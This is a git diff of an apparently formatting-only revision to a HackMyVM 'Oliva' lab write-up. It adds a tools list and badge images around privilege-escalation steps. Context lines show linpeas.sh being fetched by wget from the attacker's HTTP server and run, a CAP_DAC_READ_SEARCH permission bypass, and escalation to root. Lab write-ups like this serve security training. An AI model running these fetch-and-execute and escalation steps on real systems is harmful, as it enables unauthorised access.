@@ -11,9 +11,18 @@
 - Machine difficulty: 🟩 Easy
 
 <img src="https://hackmyvm.eu/img/vm/oliva.png" alt="Oliva Machine Logo" width="150"/>
+
+#### Tools Used
+
+- bruteforce-luks
+- cryptsetup
+- Gobuster
+- LinPEAS
+- Nmap
+
 #### Machine Writeup
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ifconfig`:
 ```
@@ -209,7 +218,7 @@ permitted by applicable law.
 Last login: Tue Sep 24 16:20:27 2024 from 192.168.56.118
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>oliva</code> }</b></span>
+![Victim: oliva](https://img.shields.io/badge/Victim-oliva-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
@@ -259,7 +268,7 @@ LISTEN                0                     511                                 
 LISTEN                0                     128                                            [::]:22                                           [::]:*  
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ls -alps /home/kali/Desktop/tools`:
 ```
@@ -288,7 +297,7 @@ total 10060
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>oliva</code> }</b></span>
+![Victim: oliva](https://img.shields.io/badge/Victim-oliva-64b5f6?logo=linux&logoColor=white)
 
 `wget http://192.168.56.118/linpeas.sh -P /tmp`:
 ```
@@ -304,6 +313,7 @@ linpeas.sh                                      100%[===========================
 ```
 
 `chmod +x /tmp/linpeas.sh`
+
 `/tmp/linpeas.sh > /tmp/linpeas_output.txt`:
 
 `cat -n /tmp/linpeas_output.txt`:
@@ -380,14 +390,16 @@ linpeas.sh                                      100%[===========================
   1143  /var/www/html/index.php
   1144  /var/www/html/index.html
 ```
+
 <div>
-        <img src="assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
-        <span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
+	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
+	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
 </div>
 
 [Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
 
-[**#CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. Its primary use is for file searching or reading purposes. However, it also allows a process to use the `open_by_handle_at(2)` function, which can access any file, including those outside the process's mount namespace. The handle used in `open_by_handle_at(2)` is supposed to be a non-transparent identifier obtained through `name_to_handle_at(2)`, but it can include sensitive information like inode numbers that are vulnerable to tampering. The potential for exploitation of this capability, particularly in the context of Docker containers, was demonstrated by Sebastian Krahmer with the shocker exploit, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). **This means that you can bypass file read permission checks and directory read/execute permission checks.**
+[**#CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 
+Enables a process to **bypass permissions for reading files and for reading and executing directories**. Its primary use is for file searching or reading purposes. However, it also allows a process to use the `open_by_handle_at(2)` function, which can access any file, including those outside the process's mount namespace. The handle used in `open_by_handle_at(2)` is supposed to be a non-transparent identifier obtained through `name_to_handle_at(2)`, but it can include sensitive information like inode numbers that are vulnerable to tampering. The potential for exploitation of this capability, particularly in the context of Docker containers, was demonstrated by Sebastian Krahmer with the shocker exploit, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). **This means that you can bypass file read permission checks and directory read/execute permission checks.**
 
 `ls -l /var/www/html/index.php`:
 ```
@@ -479,6 +491,7 @@ MariaDB [easy]> select * from logging; ←
 +--------+------+--------------+
 1 row in set (0,015 sec)
 ```
+
 `exit`
 
 `su root`:
@@ -486,7 +499,7 @@ MariaDB [easy]> select * from logging; ←
 Contraseña: ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>root</code> }</b></span>
+![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
@@ -499,6 +512,7 @@ uid=0(root) gid=0(root) grupos=0(root) ←
 ```
 
 `cd /root`
+
 `ls -alps`:
 ```
 total 32
